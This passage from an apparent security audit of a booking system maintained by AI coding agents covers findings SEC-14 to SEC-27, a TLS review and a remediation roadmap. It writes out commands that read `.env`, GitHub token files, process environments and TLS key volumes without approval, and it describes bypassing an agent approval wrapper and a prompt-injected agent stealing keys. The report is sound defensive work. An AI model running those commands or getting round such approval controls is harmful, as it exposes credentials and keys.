- `:226-228`: `uname|df|free|ps|ls|cat|head|tail|grep) CLASSIFICATION="read-only"` with no path restriction. So `cat /opt/booking-system-qa/projects/sauna/.env`, `cat ~/.config/gh/hosts.yml` and `ps eww` (process environments) all run **without** the y/N prompt.
- `:262`: `docker inspect` and `docker logs` are read-only, which exposes env secrets (SEC-13) and log-mode login codes (SEC-06).
- `:286`: `git diff` and `git log` are read-only, but `--output=<file>` writes files.
- `:160-165`: `ControlMaster=auto` with `ControlPersist=10m` leaves a socket that any process of the same local user can reuse with plain `ssh -S <path>`, bypassing the wrapper and its audit log. The skill text admits "The wrapper is an approval/audit control, not a sandbox" (`dev-ops/skills/dev-server-ssh/SKILL.md:57`).

**Recommendation.** Use a dedicated remote user with a `ForceCommand` or sudoers allowlist on the server, which is the real boundary. In the wrapper, refuse paths matching `\.env|\.ssh|\.config/gh|/proc/.*/environ|secrets`; classify `docker inspect/logs`, `ps e*` and `git --output` as impactful; set `ControlPersist=no` (or 30s) with a per-invocation `ControlPath` in a 0700 directory removed on exit.

### SEC-15 - GDPR: append-only PII with no erasure path (Medium, L)

**Evidence**
- `AGENTS.md:35`: "**No deletes:** not even super users may delete data". `product/backend/README.md:18`: "Events are append-only".
- `migrations/0001_create_events.sql` stores `payload JSONB` permanently.
- User events contain plaintext `email` and `address` (`internal/user/events.go:35-37`). Auth events use the **email as `aggregate_id`** (`internal/auth/commands.go:95`, `:160`), so PII sits in an indexed key.
- `notification_outbox` (`migrations/0010`) stores recipients and message bodies with no retention.
- `login_codes` and `sessions` are never purged.
- Removing a user only deactivates them.
- QA may hold real residents' data (log-mode codes; see SEC-06).

**Recommendation**
- **Crypto-shredding:** give each user a data-encryption key stored in a deletable `user_keys` table (or KMS). Encrypt PII fields (email, address, names) inside event payloads, and use the user UUID, not the email, as `aggregate_id` for auth events. An erasure request deletes the key; projections rebuild with "[erased]". This keeps the event log immutable while making the data unreadable. Add a lookup projection `email_hash → user_id` (HMAC with a server pepper) for login.
- Retention jobs (expressed as "expired" projections, not event deletes): `login_codes` older than 1 day, revoked or expired `sessions`, delivered `notification_outbox` rows after 30–90 days, logs at 30 days.
- Paperwork: privacy notice for residents, a record of processing activities, a DPA with the SMTP provider and with SigNoz if hosted elsewhere, and a rule that QA uses only synthetic data. Revise the "no deletes" rule in `AGENTS.md` to "no deletes except legally required erasure via crypto-shredding", so agents don't fight it.

### SEC-16 - `setup.sh` defaults (Medium, S)

**Evidence**
- `projects/sauna/setup.sh:36`: `curl -fsSL https://get.docker.com | sh` run as root (`:12`).
- `:49-51` copies `.env.example`, which has `POSTGRES_PASSWORD=change-me` and `EMAIL_MODE=log`, only **warns**, then `. ./.env` and `docker compose up -d --build` (`:57-60`).
- Compose falls back to `booking:booking` (`docker-compose.yml:65,103`).
- Postgres is not published, so the default password is reachable only from the compose network, but log-mode email (SEC-06) goes live immediately.

**Recommendation.** If the `.env` was just created, generate a random password (`openssl rand -base64 24`), set `EMAIL_MODE=smtp`, and exit without starting until SMTP is filled in. Install Docker from the distro or Docker apt repo with GPG verification instead of `curl | sh`.

### SEC-17 - No per-code attempt limits (Low, S)

**Evidence**
- `POST /users/me/email/confirm` (`internal/user/http.go:212-242`, `internal/user/commands.go` `handleConfirmOwnEmail`, `auth.VerifyCodeHash` at about line 466) has **no** rate limit and no attempt counter during the 15-minute code lifetime (`internal/user/service.go:26`).
- Each attempt costs one bcrypt comparison, which is CPU-bound.
- Login verify is limited per email and per (global, see SEC-07) IP, but a code is never invalidated after failures.
- The practical brute-force odds against 36^6 codes are low (estimate ≲10⁻³ per window). The bigger risk is CPU pressure from a single authenticated user.

**Recommendation.** Add attempts to the pending-change and login-code projections, invalidate after 5 failures, and rate-limit the confirm endpoint per user.

### SEC-18 - Internal error strings returned to clients (Low, S)

**Evidence**
- `internal/server/server.go:237-239` (`writeError(w, authStatus(err), err.Error())`, including the 500 default, for example `auth: send login code: dial tcp …`).
- `internal/user/http.go:76,101,136,…` and `internal/ical/http.go:82,158` behave the same way.

**Recommendation.** For 5xx responses, return `{"error":"internal error","requestId":…}` and log the details server-side.

### SEC-19 - Input handling details (Low, S)

**Evidence**
- `decodeJSON` caps bodies at 1 MiB (`server.go:216-225`), but user and broadcast handlers use `json.NewDecoder(r.Body)` with no limit (`internal/user/http.go:124,186,226,265,301`). Exposure is bounded by `ReadTimeout: 5s`.
- `internal/ical/http.go:186-201` builds the calendar URL from `X-Forwarded-Proto` and `X-Forwarded-Host` when `PUBLIC_BASE_URL` is unset, so a caller can make the URL shown to *themselves* point elsewhere. The impact is low (self-only) but it is fragile.

**Recommendation.** Use `http.MaxBytesReader` in a shared decoder. Require `PUBLIC_BASE_URL` at startup and drop the header fallback.

### SEC-20 - CI and image pinning (Low, S)

**Evidence**
- `backend-ci.yml`, `security.yml` and `semgrep.yml` use tags: `actions/checkout@v4`, `actions/setup-go@v5`, `actions/dependency-review-action@v4`, `gitleaks/gitleaks-action@v2`. `frontend-ci.yml` and `sidecar-ci.yml` are SHA-pinned.
- The `semgrep/semgrep` container is unpinned (`semgrep.yml:27-28`), and `go install golang.org/x/vuln/cmd/govulncheck@latest` (`security.yml:42`) is unpinned.
- Compose images: `caddy:2-alpine`, `postgres:16-alpine`, `authelia/authelia:latest` (an unconfigured skeleton: `config/authelia/configuration.yml` sets only `server.address`) and `cloudflare/cloudflared:latest`. Builder images are tag-only.
- Positive: `permissions: contents: read` everywhere, no `pull_request_target`, and secrets are not exposed to fork PRs.

**Recommendation.** Pin actions to commit SHAs and images to `@sha256:` digests, and let Dependabot (`github-actions`, `docker`, `gomod`, `npm`) bump them. Remove the Authelia service until it is designed.

### SEC-21 - Outsiders can spoof factory control signals (Low, S)

**Evidence**
- `has_marker` and `has_pr_marker` treat **any** comment containing `<!-- factory:plan -->`, `<!-- factory:build -->` or the fix marker as authoritative (`tick.sh:455-476`). An outsider can comment the marker on an approved issue and the factory permanently skips it.
- `recover_issue` comments on and closes the first open issue whose title matches "QA deployment failed", whoever opened it (`deploy-environment.sh:156-163`). `surface_failure` appends to it (`:136-153`).

**Recommendation.** Count markers only from the bot identity (filter on `.comments[] | select(.author.login == "<bot>")`). Have `surface_failure` and `recover_issue` match only issues authored by the bot.

### SEC-22 - The Let's Encrypt certificate advertises the QA host, and QA has no access gate (High, M)

**Evidence**
- In direct mode, the mode the deploy actually uses (`deploy-environment.sh:352` runs only the base `docker-compose.yml`), Caddy obtains a publicly trusted Let's Encrypt certificate for `SITE_ADDRESS` (`Caddyfile:47-49`, `dev-ops/tls-letsencrypt.md:19-23`).
- Every publicly trusted certificate is logged in Certificate Transparency (CT) logs, by CA/browser policy. The QA FQDN (for example `qa.booking.example.com`, `tls-letsencrypt.md:19`) therefore becomes public the moment it's issued, and scanners routinely watch CT logs for new hostnames.
- Nothing in front of QA restricts who can reach it:
  - Authelia is an unconfigured stub. `config/authelia/configuration.yml` contains only `server.address`, and the service sits behind an opt-in `profiles: ["authelia"]` (`docker-compose.yml:114-123`), even though the README lists Authelia as the AuthN/AuthZ component.
  - The tunnel overlay, with its option of Cloudflare Access, is not used by the deploy (SEC-27).
- What a scanner then finds on the same host:
  - the full app over HTTP on `:80` and `:8080` (SEC-24);
  - SigNoz UI `:3301`, whose first signup becomes admin, and unauthenticated OTLP on `:4317`/`:4318` (SEC-12);
  - an app whose first code requester on an empty database becomes admin (SEC-08);
  - login codes in logs (SEC-06).

**Attack scenario.** A QA certificate is issued, and its hostname appears in CT search within minutes. An opportunistic scanner, or anyone watching the domain, finds the host. Someone claims the SigNoz admin account and reads traces, including iCal tokens (SEC-12). Or, after a QA database reset, they request a code first and become app admin (SEC-08). Every QA page is also reachable over cleartext.

**Recommendation**
1. **Gate QA.** It's a test environment, so nobody but the owner and testers needs it. Choose one:
   - Cloudflare Tunnel plus **Cloudflare Access** (email OTP), with no published ports (SEC-11);
   - Tailscale-only access;
   - Caddy `basic_auth` on the QA site, exempting `/healthz` and `/calendar/*` if feed testing is needed;
   - a properly configured Authelia `forward_auth`.

   Remove the Authelia stub until it's designed (SEC-20).
2. **Don't name QA in CT.** Issue a wildcard `*.booking.example.com` via **DNS-01** (Caddy built with a DNS-provider module and a zone-scoped API token). CT then shows only the wildcard. This hides the hostname but is no substitute for step 1.
3. **Add CAA records** that limit issuance to Let's Encrypt, bind it to your ACME account (RFC 8657 `accounturi`), and pin the validation method:

```dns
booking.example.com.  CAA 0 issue "letsencrypt.org; accounturi=https://acme-v02.api.letsencrypt.org/acme/acct/<ACCOUNT_ID>; validationmethods=http-01"
booking.example.com.  CAA 0 issuewild ";"
booking.example.com.  CAA 0 iodef "mailto:security@example.com"
```

   (Adjust `issuewild` and `validationmethods=dns-01` if you adopt the wildcard.)
4. Keep QA on **synthetic data only** (SEC-15), and close SEC-08 and SEC-12 before the first certificate is issued.

### SEC-23 - Certificate lifecycle is unmonitored (Medium, S)

**Evidence**
- **Contact address:** the default ACME contact is `admin@localhost` (`Caddyfile:14`, `docker-compose.yml:27`), and `.env.example:48-50` ships `ACME_EMAIL=` empty, so the default applies unless the operator sets it. ACME servers reject contact addresses on non-public domains, so with a real `SITE_ADDRESS`, account registration and therefore issuance will likely fail. Because `acme_ca` is set explicitly (`Caddyfile:15`), Caddy likely won't fall back to another CA. Neither point was tested.
- **Stale assumption:** `.env.example:48` and `tls-letsencrypt.md:24` say the address receives "expiry/abuse notices". Let's Encrypt stopped sending expiration notification emails in 2025, so even a valid address no longer warns of a failing renewal.
- **Nothing tests TLS:** the deploy health check is `curl -fsS "http://127.0.0.1:${PORT}/healthz"` (`deploy-environment.sh`, after `compose up`). That is plain HTTP through the `:80` catch-all, so it never touches the certificate. The TLS checks in `tls-letsencrypt.md:91-108` are manual. SigNoz has no certificate or uptime check and no alerts (OBS-04).
- **Shorter lifetimes coming:** Let's Encrypt has announced a staged move to shorter certificate lifetimes, which shrinks the window between a renewal failure and an outage.

**Attack and failure scenario.** A rejected account, or a renewal that fails (port 80 blocked by a firewall change, DNS moved, or rate-limited after repeated failed validations; see `tls-letsencrypt.md:86`), goes unnoticed. Deploys keep reporting "success". Residents eventually get browser certificate errors, and some will click through or fall back to `http://` (SEC-24), which teaches them to ignore TLS warnings.

**Recommendation**
- Drop the `admin@localhost` fallback. Either remove the global `email` option entirely (ACME accounts don't need a contact) or fail the deploy if `SITE_ADDRESS` is a public FQDN and `ACME_EMAIL` is empty or `@localhost`. Fix the docs' "expiry notices" claim.
- Add a TLS step to the deploy health check, reading `SITE_ADDRESS` from `projects/sauna/.env`:

```sh
if [[ -n "$SITE_ADDRESS" && "$SITE_ADDRESS" != localhost && "$SITE_ADDRESS" != http://* ]]; then
  curl -fsS --max-time 10 "https://${SITE_ADDRESS}/healthz" >/dev/null || fail "https health check failed"
  end="$(openssl s_client -connect "${SITE_ADDRESS}:443" -servername "$SITE_ADDRESS" </dev/null 2>/dev/null \
         | openssl x509 -noout -enddate | cut -d= -f2)"
  days=$(( ( $(date -d "$end" +%s) - $(date +%s) ) / 86400 ))
  (( days >= 14 )) || fail "certificate for $SITE_ADDRESS expires in ${days} days"
fi
```

- Add continuous monitoring that doesn't depend on deploys. Options: an external uptime and TLS-expiry check (which also proves reachability from the internet), the collector's `httpcheck` receiver if the pinned collector version reports certificate expiry, or a daily timer that writes days-to-expiry into the factory JSONL. Alert at 14 days or fewer (OBS-04).
- Alert on Caddy `obtain`/`renew` errors in its logs. Docker logs aren't shipped today (OBS-07/OBS-09).

### SEC-24 - TLS is optional by construction (Medium, S)

**Evidence**
- `Caddyfile:51-53` defines a `:80 { import app }` catch-all. It serves the SPA, `/api/*` and `/calendar/*` over plain HTTP for **any** `Host` header: the IP address, a wrong name, or `localhost`.
- `docker-compose.yml:20-21` maps both `${PORT:-8080}:80` and `80:80` to that listener on all interfaces.
- `tls-letsencrypt.md:30-33` says the catch-all exists for the health check and that `SITE_ADDRESS` requests are auto-redirected. Whether Caddy's automatic redirect still applies alongside an explicit catch-all is unverified (SEC-11).
- There is no HSTS (SEC-11). The redirect, even when it works, covers only the exact `SITE_ADDRESS`.

**Attack scenario.** A resident follows an `http://` link, an old bookmark, or the raw IP or `:8080` address that appears in deploy issues and docs. They log in, and the login code and the bearer token (`Authorization` header; SEC-10) cross the network in cleartext. On shared Wi-Fi, an attacker on path takes over the session for up to 24 hours. Without HSTS, an active attacker can also strip the redirect on first visit.

**Recommendation.** Separate the health listener from the public listener, and make public HTTP redirect-only.

```caddy
{
	acme_ca {$ACME_CA:https://acme-v02.api.letsencrypt.org/directory}
	# direct mode: no trusted_proxies (SEC-25)
}

(app) {
	import security_headers        # SEC-11, incl. Strict-Transport-Security
	root /srv
	# … existing handle blocks …
}

{$SITE_ADDRESS:localhost} {
	import app                     # Caddy adds the :80 → :443 redirect and serves ACME HTTP-01 on :80
}

:8079 {                            # internal health listener only
	handle /healthz {
		reverse_proxy backend:8080
	}
	respond 404
}
```

```yaml
# docker-compose.yml (caddy)
ports:
  - "127.0.0.1:${PORT:-8080}:8079"   # deploy health check, loopback only
  - "80:80"                          # redirect + ACME only
  - "443:443"
```

Enable HSTS only after the TLS check from SEC-23 passes. Start with a short `max-age` and raise it to a year. In tunnel mode, set the site address to `:80` (any host, HTTP) **and** remove published ports, since there the origin must never be reachable except through cloudflared (SEC-11, SEC-27).

### SEC-25 - `trusted_proxies private_ranges` in direct mode lets local traffic spoof client IP, scheme and host (Medium, S)

**Evidence**
- `Caddyfile:16-21`: `trusted_proxies static private_ranges`. The comment says it is meant for "the cloudflared connector or a local reverse proxy" and adds "Tighten to the exact proxy CIDR if the topology is known".
- The deploy runs **direct mode** (no cloudflared; `deploy-environment.sh:352`), where no proxy sits in front of Caddy.
- When the immediate peer is trusted, Caddy keeps the incoming `X-Forwarded-For`, `X-Forwarded-Proto` and `X-Forwarded-Host` instead of overwriting them, and derives `{client_ip}` from them.
- Connections that reach a published port through Docker's userland proxy arrive from the bridge gateway, a private address, so they count as trusted. That covers connections from the host itself (including factory agents and any local process) and, on hosts where Docker's IPv6 is disabled, IPv6 clients from the internet. Not verified on the host.

**Attack scenario.**
- Once SEC-07 is fixed with `X-Real-IP {client_ip}` as recommended, a client on an affected path can send `X-Forwarded-For: <victim-ip>` to lock a resident out, or a random value per request to dodge the limiter entirely.
- A forged `X-Forwarded-Host` or `-Proto` flows into the calendar URL builder (SEC-19, `internal/ical/http.go:186-201`).
- Logs and traces record attacker-chosen IPs.

**Recommendation.** Make trust explicit per mode:

```caddy
servers {
	trusted_proxies static {$TRUSTED_PROXIES:127.0.0.1/32}   # effectively "none" in direct mode
	client_ip_headers {$CLIENT_IP_HEADER:X-Forwarded-For}
}
```

- In the tunnel overlay, give cloudflared a fixed address on a dedicated network (`ipv4_address: 172.30.0.10`), and set `TRUSTED_PROXIES=172.30.0.10/32` and `CLIENT_IP_HEADER=Cf-Connecting-Ip`.
- In the backend, require `PUBLIC_BASE_URL` (SEC-19) and take the client IP only from the single header Caddy sets.
- Optionally set `"userland-proxy": false` in Docker's `daemon.json`, after checking the impact on local access.

### SEC-26 - TLS private keys and the ACME account key are readable by the factory's agents (Medium, M)

**Evidence**
- Caddy keeps certificate private keys and the ACME account key in the named volume `booking-<env>-caddy-data` (`docker-compose.yml:31,125-131`; `tls-letsencrypt.md:27-29`).
- Anyone who can talk to the Docker daemon can read any volume, and the factory and the deploy run as a user with Docker access on the same host (threat model TB3; OPS-16). For example: `docker run --rm -v booking-qa-caddy-data:/d:ro alpine find /d -name '*.key'`.
- Agents run with `--auto` and no sandbox by default (SEC-03), and can be steered by outsiders (SEC-01/02).
- The volume isn't backed up (OPS-03 covers only the database).

**Attack scenario.** A prompt-injected or misbehaving agent copies the site's private key, plus the ACME account key, which can request certificates for the same names over HTTP-01 and revoke existing ones. With the key, an attacker who gains a network position (or DNS) can impersonate the booking site to residents until the certificate expires or is revoked. With the account key, they can revoke the live certificate to cause an outage.

**Recommendation**
- The real fix is the separation from SEC-03 and OPS-16. Factory sessions run as a user **without** Docker access, in a disposable sandbox; the deploy runs as a separate user (ideally rootless Docker).
- Until then, treat the TLS key as exposed. Prefer short certificate lifetimes, keep CAA `accounturi` binding (SEC-22), and know the revocation procedure.
- Back up `caddy-data`, encrypted, together with the database. Losing it forces re-issuance and can hit the duplicate-certificate rate limit (`tls-letsencrypt.md:84`).

### SEC-27 - The certificate topology doesn't match the environment model (Low, M)

**Evidence**
- `docker-compose.yml:21-22` publishes `80:80` and `443:443` fixed for every compose project.
- `dev-ops/environments.yaml` is designed for several environments per host: QA on 8080, plus commented "candidate environments for release branches … port: 8081".
- `tls-letsencrypt.md:120-126` itself concludes that two Caddy instances cannot share a host. A second environment will therefore fail to start on a port conflict, which tempts someone to "fix" it by dropping TLS or publishing differently.
- The deploy runs `docker compose -f docker-compose.yml up -d --build --remove-orphans` (`deploy-environment.sh:352`). If QA was ever started with the tunnel overlay, cloudflared belongs to the same project and is **removed as an orphan** on the next scheduled deploy. Caddy then reverts to the `.env` `SITE_ADDRESS` with published ports, which silently changes the exposure model from tunnel to direct (also OPS-17).

**Recommendation**
- Record the exposure mode per environment in `environments.yaml` (for example `compose_files: [docker-compose.yml, docker-compose.cloudflare-tunnel.yml]` and `tls: tunnel|direct|dns01`), and have the deploy pass exactly those files.
- For several environments on one host, run **one edge Caddy per host**, with its own compose project and a single `caddy-data`, holding one site block per environment that proxies to each environment's internal Caddy or backend. Alternatively, use DNS-01 with per-environment hostnames.
- Add a deploy preflight that refuses to deploy when the effective mode differs from the recorded one.

---

## Let's Encrypt and TLS review

This section summarises how the repository uses Let's Encrypt, as requested in the addendum. The findings it refers to are above.

| Aspect | Current setup (evidence) | Assessment |
|---|---|---|
| Issuance and renewal | Caddy automatic HTTPS, ACME HTTP-01, `acme_ca` defaulting to LE production (`Caddyfile:13-15`; `tls-letsencrypt.md:17-29`) | **Good.** Standard, automatic renewal with no cron or certbot. |
| Environment isolation | One `caddy-data` volume, and so one ACME account and key set, per compose project (`docker-compose.yml:125-131`) | **Good in design.** In practice limited to one environment per host (SEC-27). |
| Staging-first issuance | Documented, with rate-limit notes (`tls-letsencrypt.md:62-89`) | **Good, but manual.** Not enforced by the deploy. |
| ACME contact | Defaults to `admin@localhost`; the doc says it's for expiry notices | **Broken.** Likely rejected, and LE no longer sends expiry emails (SEC-23). |
| Renewal and expiry monitoring | None. The deploy health check is HTTP-only. | **Gap** (SEC-23, OBS-04) |
| HTTP→HTTPS | Relies on Caddy's auto-redirect next to a `:80` catch-all that serves the full app for any host, plus `${PORT}` on all interfaces | **Weak.** TLS is optional (SEC-24, SEC-11). |
| HSTS and security headers | None | **Gap** (SEC-11) |
| CAA and DNS hardening | Not documented | **Gap.** Add CAA with `accounturi` (SEC-22). |
| Hostname exposure | Each certificate publishes the QA FQDN in CT logs; QA has no access gate | **Risk** (SEC-22) |
| Private key protection | Keys in a Docker volume readable by the factory's Docker-capable user; no backup | **Risk** (SEC-26) |
| Proxy trust | `trusted_proxies private_ranges` even in direct mode | **Too broad** (SEC-25) |
| Tunnel mode | Correctly disables ACME via an `http://` site address, but ports stay published and the deploy drops cloudflared | **Mixed** (SEC-11, SEC-27) |
| Images on the TLS edge | `caddy:2-alpine`, `cloudflare/cloudflared:latest` | **Unpinned** (SEC-20) |

**Overall:** the Let's Encrypt integration itself is correct and low-maintenance. Its weaknesses are around it: nothing enforces that clients actually use TLS, nothing notices when the certificate stops renewing, and getting a certificate advertises a host that isn't ready to be found.

---

## Not verified / out of reach (static review)
- (Addendum) Which TLS mode QA actually runs in. It depends on the gitignored `projects/sauna/.env`. If `SITE_ADDRESS` is unset, QA serves Caddy's internal self-signed certificate on 443 and is effectively HTTP-only on 80/8080. Whether a Let's Encrypt certificate has ever been issued for QA can be checked in a CT search for the domain.
- (Addendum) Whether ACME registration with `admin@localhost` is rejected in practice, whether the pinned `acme_ca` disables Caddy's fallback issuer, and whether Docker's userland proxy and IPv6 setup on the host make SEC-25 exploitable from the internet or only locally.
- Whether the Caddy HTTP→HTTPS redirect is effective with the `:80` catch-all (SEC-11), and whether the QA host firewall blocks 3301/4317/4318 (SEC-12).
- The installed OpenCode version, and whether V1 agent frontmatter is still honoured (SEC-04).
- Whether the cron factory and the deploy timer run as the same Unix user (SEC-03). Whether the QA database holds real residents' data.
- The `gh` token type and scopes on the factory host. The evidence points to `workflow` scope (SEC-03), but `gh auth status` would confirm.
- The fork-PR fix path (SEC-02) was traced in code and not exercised.
- Git history: no credentials found. The owner's personal email address appears as the author email on 11 commits; that is commit metadata, low risk, and noted only for awareness.

---

## Prioritized roadmap

**Now (this week; stops the critical chains)**
1. Pause the cron tick, or set interaction limits to "collaborators only", until 2–5 are done. (SEC-01/02/03)
2. Author and association filter in both discovery scripts; skip cross-repo PRs; markers only from the bot. (SEC-01, SEC-02, SEC-21)
3. Remove `gh issue edit*` from the planner; verify who applied the `owner approved` label. (SEC-01)
4. Move the factory from the owner token to a fine-grained, repo-scoped bot token with no `workflow` or admin. Add a ruleset on `main` (PR, required checks, CODEOWNERS approval for `.github/`, `dev-ops/`, `.opencode/`). (SEC-03)
5. Stop posting raw logs to issues; redact issue #101; refuse `EMAIL_MODE=log` outside `DEV_MODE`. (SEC-06)
6. Fix client-IP extraction (`X-Real-IP {client_ip}` from Caddy) and add limiter eviction. (SEC-07) Do it together with narrowing `trusted_proxies` (SEC-25); otherwise `{client_ip}` can be spoofed.
6a. (Addendum) Put QA behind an access gate (Cloudflare Access, Tailscale or `basic_auth`) before any public certificate is issued. Remove the `admin@localhost` ACME default, and add an HTTPS and expiry check to the deploy health check. (SEC-22, SEC-23)

**Next (2–4 weeks)**
7. Run agent sessions in throwaway containers or VMs off the QA host, with egress allowlist and no `$HOME` or Docker socket; drop `--auto` or pair it with a V2 default-deny ruleset; convert agent frontmatter to V2. (SEC-03, SEC-04)
8. Pin skills to SHAs with hash verification; prune unused skills. (SEC-05)
9. Configured admin bootstrap; role-gate `GET /users`. (SEC-08, SEC-09)
10. HttpOnly cookie sessions, a logout and revoke endpoint, revocation on email change. (SEC-10)
11. Caddy security headers, loopback-bound ports, port reset in tunnel mode; SigNoz on loopback plus token redaction in traces. (SEC-11, SEC-12)
12. Per-service env and secrets; remove `DEV_SERVER_*` from the deploy `.env`; harden the SSH wrapper. (SEC-13, SEC-14)
12a. (Addendum) Restructure Caddy: a loopback-only health listener, redirect-only public `:80`, HSTS after the TLS check passes, and per-mode `trusted_proxies`. Add continuous certificate-expiry alerting. (SEC-24, SEC-25, SEC-23)
12b. (Addendum) Take Docker access away from factory sessions so they can't read TLS keys, and back up `caddy-data` (encrypted). (SEC-26, with SEC-03)

**Later (before real residents' data goes live)**
13. Crypto-shredding for PII in events, UUID aggregate IDs, retention jobs, privacy notice, record of processing, DPAs; synthetic data only in QA. (SEC-15)
14. Make `setup.sh` safe by default. (SEC-16)
15. Per-code attempt limits, generic 5xx errors, body caps, required `PUBLIC_BASE_URL`. (SEC-17/18/19)
16. SHA and digest pinning with Dependabot; remove or design Authelia. (SEC-20)
17. (Addendum) CAA records with `accounturi`. A wildcard via DNS-01 so environment hostnames stay out of CT logs. Exposure mode recorded per environment in `environments.yaml`, and one edge Caddy per host for multiple environments. (SEC-22, SEC-27)
